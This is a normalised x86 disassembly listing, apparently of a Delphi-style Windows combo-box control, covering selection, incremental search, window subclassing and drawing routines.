push sub_44571b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445722
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov ecx eax
mov eax esi
pop edx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_445728
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
inc eax
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov edx eax
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_445768
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_40439c
xor eax eax
push ebp
push sub_4457b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x23c ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4457b8
lea eax [ ebp - 0x4 ]
call sub_403eec
retn
sub_4457c0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_4449a8
mov eax ebx
mov edx [ eax ]
call [ edx + 0xf8 ]
mov dl 0x1
call sub_403144
mov esi eax
mov [ ebx + 0x23c ] esi
mov [ esi + 0x10 ] ebx
mov [ ebx + 0x238 ] 0x10
mov [ ebx + 0x276 ] 0x0
xor eax eax
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x268 ] 0x1
mov [ ebx + 0x290 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_445844
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x23c ]
call sub_403174
mov eax [ esi + 0x278 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_444a9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_445894
push ebx
mov ebx eax
cmp dl [ ebx + 0x276 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x276 ] dl
cmp dl 0x1
jne r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
jmp r-xdata
mov eax ebx
call sub_4513bc
sub_4458f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450ca8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450bd4
mov eax [ esi + 0x4 ]
or eax 0x200240
xor edx edx
mov dl [ ebx + 0x276 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x275 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x274 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
retn
sub_445959
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov ebx eax
mov eax ebx
call sub_445578
mov eax ebx
call sub_453e1c
mov [ ebx + 0x248 ] eax
mov esi [ ebx + 0x278 ]
test esi esi
je r-xdata
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebx + 0x278 ]
call sub_403174
xor eax eax
mov [ ebx + 0x278 ] eax
cmp [ ebx + 0x260 ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x5
mov eax ebx
call sub_453e1c
push eax
call GetWindow
mov esi eax
test esi esi
je r-xdata
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x260 ]
jge r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
push 0x0
mov eax [ ebx + 0x260 ]
push eax
push 0x14e
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov [ ebx + 0x260 ] eax
push 0x0
push 0x3
push 0xd3
mov eax [ ebx + 0x240 ]
push eax
call SendMessageA
mov edi esi
mov [ ebx + 0x240 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x250 ] eax
mov eax [ ebx + 0x24c ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x240 ]
push eax
call SetWindowLongA
mov edi esi
mov [ ebx + 0x244 ] edi
push 0xfffffffc
push edi
call GetWindowLongA
mov [ ebx + 0x258 ] eax
mov eax [ ebx + 0x254 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x244 ]
push eax
call SetWindowLongA
push 0x2
push esi
call GetWindow
mov esi eax
sub_445a9c
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
test eax eax
jle r-xdata
mov eax ebx
call sub_4511b8
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x260 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x278 ] esi
mov edx [ ebx + 0x23c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_445aec
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x276 ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424244
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
mov [ esi + 0xc ] 0x1
jmp r-xdata
add esp 0x10
pop esi
pop ebx
retn
sub_445b40
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
push esi
push ebx
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov eax [ esi ]
cmp eax [ ebx ]
seta al
pop esi
pop ebx
pop ebp
retn
sub_445b6c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor eax eax
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_445c28
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44d634
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x140
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
inc edx
lea eax [ ebp - 0xc ]
call sub_40444c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xc ]
call sub_44d664
mov bx [ ebp - 0x4 ]
mov edx ebx
mov eax ebx
call sub_406ad0
push eax
push 0x0
push 0x142
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445c2f
lea eax [ ebp - 0xc ]
call sub_403eec
retn
sub_445c34
push ebp
mov ebp esp
mov ecx 0xb
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445fec
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452e00
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x268 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445ff3
lea eax [ ebp - 0x58 ]
mov edx 0x5
call sub_403f10
lea eax [ ebp - 0x44 ]
call sub_403eec
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x38 ]
mov edx 0x2
call sub_403f10
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f10
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x26c ]
cmp eax 0x1f4
jb r-xdata
lea edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
call sub_44d634
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f40
jmp r-xdata
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403eec
mov al [ ebx ]
sub al 0x8
je r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_445b40
pop ecx
test al al
je r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x276 ]
sub al 0x2
jae r-xdata
push ebp
call sub_445b6c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
sub al 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041ac
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_40c0c0
cmp al 0x2
je r-xdata
lea edx [ ebp - 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_44d634
mov eax [ ebp - 0x38 ]
call sub_4041ac
test eax eax
jle r-xdata
mov [ ebx ] 0x0
mov eax [ ebp - 0x4 ]
mov si 0xffb3
call sub_403370
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_444b68
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x269 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041ac
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40444c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
call sub_4041ac
mov edx eax
mov eax [ ebp - 0x4 ]
add eax 0x270
mov ecx 0x1
call sub_40444c
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44d634
mov esi [ ebp - 0x8 ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_444b8c
jmp r-xdata
push ebp
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_445b40
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_444b68
test al al
jne r-xdata
mov edx esi
mov eax [ ebp - 0x14 ]
call sub_40c0c0
cmp al 0x2
je r-xdata
lea eax [ ebp - 0x50 ]
mov dl [ ebx ]
call sub_4040d4
mov ecx [ ebp - 0x50 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
lea eax [ ebp - 0x14 ]
call sub_4041f8
lea eax [ ebp - 0x48 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov ecx [ ebp - 0x8 ]
mov edx 0x1
call sub_40440c
mov eax [ ebp - 0x48 ]
push eax
lea eax [ ebp - 0x4c ]
mov dl [ ebx ]
call sub_4040d4
mov ecx [ ebp - 0x4c ]
lea eax [ ebp - 0x14 ]
pop edx
call sub_4041f8
jmp r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_444b8c
dec esi
lea eax [ ebp - 0x10 ]
push eax
mov ecx esi
dec ecx
mov edx 0x1
mov eax [ ebp - 0x14 ]
call sub_40440c
push 0x0
push 0xffffffff
push 0x14e
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
lea eax [ ebp - 0x40 ]
push eax
mov edx [ ebp - 0xc ]
inc edx
mov ecx 0x7fffffff
mov eax [ ebp - 0x14 ]
call sub_40440c
mov ecx [ ebp - 0x40 ]
lea eax [ ebp - 0x3c ]
mov edx [ ebp - 0x10 ]
call sub_4041f8
mov edx [ ebp - 0x3c ]
mov eax [ ebp - 0x4 ]
call sub_44d664
mov edi esi
dec edi
mov edx edi
mov eax edi
call sub_406ad0
push eax
push 0x0
push 0x142
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
call SendMessageA
lea edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
call sub_44d634
mov edx [ ebp - 0x44 ]
mov eax [ ebp - 0x4 ]
add eax 0x270
call sub_403f40
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_445ffc
test al al
je r-xdata
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
test eax eax
je r-xdata
mov al [ ebx ]
mov edx [ rw-data ]
and eax 0xff
bt [ edx ] eax
jae r-xdata
mov [ ebx ] 0x0
cmp [ ebp - 0x2c ] 0x102
jne r-xdata
lea eax [ ebp - 0x58 ]
mov dl [ ebp - 0x28 ]
call sub_4040d4
mov ecx [ ebp - 0x58 ]
lea eax [ ebp - 0x54 ]
mov edx [ ebp - 0x14 ]
call sub_4041f8
mov edx [ ebp - 0x54 ]
mov eax [ ebp - 0x4 ]
call sub_445ffc
test al al
je r-xdata
push 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_453e1c
push eax
lea eax [ ebp - 0x30 ]
push eax
call PeekMessageA
mov [ ebx ] 0x0
jmp r-xdata
sub_445ffc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4461b1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_4041ac
test eax eax
jne r-xdata
mov eax esi
call sub_4043ac
push eax
push 0xffffffff
push 0x14c
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
setne [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
or edx 0xffffffff
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
mov eax ebx
mov si 0xffb3
call sub_403370
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4461b8
lea eax [ ebp - 0x1c ]
call sub_403eec
lea eax [ ebp - 0x18 ]
mov edx 0x3
call sub_403f10
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
cmp eax [ ebp - 0x8 ]
setne [ ebp - 0x9 ]
cmp [ ebx + 0x290 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
push 0x14e
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov al [ ebx + 0x276 ]
sub al 0x2
jae r-xdata
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
inc eax
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xd0 ]
lea eax [ ebx + 0x270 ]
mov edx esi
call sub_403f40
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x23c ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0x18 ]
push eax
mov eax esi
call sub_4041ac
mov edx eax
inc edx
mov ecx 0x7fffffff
pop eax
call sub_40440c
mov ecx [ ebp - 0x14 ]
lea eax [ ebp - 0x10 ]
mov edx esi
call sub_4041f8
mov edx [ ebp - 0x10 ]
mov eax ebx
call sub_44d664
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44d634
mov eax [ ebp - 0x1c ]
call sub_4041ac
push eax
mov eax esi
call sub_4041ac
pop edx
call sub_406ad0
push eax
push 0x0
push 0x142
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
jmp r-xdata
push 0x0
push 0x0
push 0x14f
mov eax ebx
call sub_453e1c
push eax
call SendMessageA
mov eax ebx
mov si 0xffeb
call sub_403370
mov eax ebx
mov si 0xffb2
call sub_403370
cmp [ ebp - 0x9 ] 0x0
je r-xdata
sub_4461e4
push ebx
push esi
push edi
push ebp
mov esi eax
mov ebx [ edx + 0x8 ]
mov di [ ebx + 0x10 ]
mov ebp [ ebx + 0x10 ]
test ebp 0x1000
je r-xdata
test ebp 0x20
je r-xdata
or di 0x1000
mov edx [ ebx + 0x18 ]
mov eax [ esi + 0x208 ]
call sub_424af0
mov edx [ esi + 0x68 ]
mov eax [ esi + 0x208 ]
call sub_424990
mov edx [ esi + 0x170 ]
mov eax [ esi + 0x208 ]
call sub_4249ac
cmp [ ebx + 0x8 ] 0x0
jl r-xdata
or di 0x20
mov ebp [ ebx + 0x8 ]
test ebp ebp
jl r-xdata
test di 0x1
je r-xdata
lea edx [ ebx + 0x1c ]
mov eax [ esi + 0x208 ]
call sub_4245fc
push edi
lea ecx [ ebx + 0x1c ]
mov edx ebp
mov eax esi
mov ebp [ eax ]
call [ ebp + 0x110 ]
jmp r-xdata
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_424210
mov eax [ esi + 0x208 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_423a44
xor edx edx
mov eax [ esi + 0x208 ]
call sub_424af0
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x1c ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call DrawFocusRect
test di 0x10
je r-xdata
sub_4462bc
push ebx
push esi
mov esi eax
mov eax [ edx + 0x8 ]
mov edx [ esi + 0x238 ]
mov [ eax + 0x10 ] edx
cmp [ esi + 0x276 ] 0x4
jne r-xdata
pop esi
pop ebx
retn
lea ecx [ eax + 0x10 ]
mov edx [ eax + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x114 ]
sub_4462e8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5d ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
call sub_44ecb8
cmp [ ebx + 0x276 ] 0x2
jne r-xdata
push 0x15
call GetSystemMetrics
mov edx [ ebx + 0x48 ]
sub edx eax
movsx eax [ esi + 0x8 ]
cmp edx eax
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
mov eax ebx
call sub_44dcdc
pop esi
pop ebx
retn
sub_446333
mov eax ebx
call sub_44d85c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_464dc0
test eax eax
je r-xdata
cmp ebx [ eax + 0x220 ]
je r-xdata
xor edx edx
mov eax ebx
call sub_44d86c
sub_446360
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi ]
add eax 0xffff42ce
sub eax 0x7
jae r-xdata
mov edx esi
mov eax ebx
call sub_445154
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
cmp [ ebx + 0x276 ] 0x2
jae r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x170 ]
call sub_424244
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_4463bc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_451fac
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4465e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44c210
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424210
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424638
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424638
cmp [ ebx + 0x165 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
xor esi esi
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add esi [ ebx + 0x168 ]
test esi esi
jne r-xdata
add esi [ ebx + 0x168 ]
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_44cfd4
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call GetWindowLongA
mov edi eax
test [ ebx + 0x162 ] 0x1
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx [ ebx + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_424210
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424638
push 0xffffffff
push 0xffffffff
lea eax [ ebp - 0x14 ]
push eax
call InflateRect
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_424638
test [ ebx + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x24 ] esi
test [ ebx + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x20 ] esi
test edi 0x200000
je r-xdata
add [ ebp - 0x1c ] esi
test [ ebx + 0x162 ] 0x8
je r-xdata
push 0x14
call GetSystemMetrics
add [ ebp - 0x1c ] eax
test edi 0x100000
je r-xdata
add [ ebp - 0x18 ] esi
xor eax eax
mov al [ ebx + 0x162 ]
xor edx edx
mov dl [ ebx + 0x165 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
xor eax eax
mov al [ ebx + 0x163 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawEdge
push 0xa
call GetSystemMetrics
mov edx [ ebp - 0xc ]
sub edx eax
dec edx
mov [ ebp - 0x14 ] edx
mov eax ebx
call sub_444b68
test al al
je r-xdata
push 0x15
call GetSystemMetrics
add [ ebp - 0x18 ] eax
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawFrameControl
push 0x4005
push 0x3
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_424a70
push eax
call DrawFrameControl
jmp r-xdata
sub_4465f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44fb14
mov eax esi
mov edx [ r-xdata ]
call sub_403324
mov [ ebx + 0x28 ] eax
pop esi
pop ebx
retn
sub_44661c
push ebx
mov ebx eax
mov eax ebx
call sub_459c48
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax [ ebx + 0x28 ]
mov edx [ eax ]
call [ edx + 0xc8 ]
push eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_403324
pop edx
cmp dl [ eax + 0x69 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_446654
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x1
xor edx edx
push ebp
push sub_4466aa
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov [ eax + 0x208 ] 0x0
retn
sub_4466b8
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_44fb48
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
mov [ esi + 0x184 ] 0x0
sub_44670c
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_4548ec
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov dl [ esi + 0x69 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov eax edi
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
sub_446760
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x6c ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_446784
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ edi ]
sub eax 0x201
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
sub eax 0x2
je r-xdata
mov edx edi
mov eax ebx
call sub_451830
mov eax ebx
mov si 0xffb5
call sub_403370
test al al
jne r-xdata
sub eax 0xbb0e
je r-xdata
mov [ ebx + 0x208 ] 0x1
mov eax ebx
call sub_453e1c
push eax
call SetFocus
mov [ ebx + 0x208 ] 0x0
mov eax ebx
mov si 0xffb5
call sub_403370
test al al
je r-xdata
cmp [ ebx + 0x208 ] 0x0
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
jmp r-xdata
sub_4467fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_43fdc4
mov ebx eax
mov eax ebx
call sub_43fea4
test al al
je r-xdata
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_453e1c
mov edx eax
mov ecx [ edi + 0x4 ]
mov eax ebx
call sub_43ffa4
push 0x5
call GetStockObject
mov [ edi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446848
push ebx
push esi
mov esi edx
mov ebx eax
call sub_43fdc4
call sub_43fea4
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_452270
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
pop esi
pop ebx
retn
sub_446874
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_450ca8
cmp [ ebx + 0x209 ] 0x0
je r-xdata
pop esi
pop ebx
retn
or [ esi + 0x4 ] 0x2000
sub_4468ac
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4466b8
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov edx 0x4b
mov eax esi
call sub_44cdf0
mov edx 0x19
mov eax esi
call sub_44ce14
mov dl 0x1
mov eax esi
call sub_454050
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax esi
pop esi
pop ebx
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_446938
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
mov eax ebp
call sub_454120
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor esi esi
mov si 0x1
jmp r-xdata
push 0x1
push edi
push 0xf4
mov eax ebp
call sub_453e1c
push eax
call SendMessageA
push 0xfffffff0
mov eax ebp
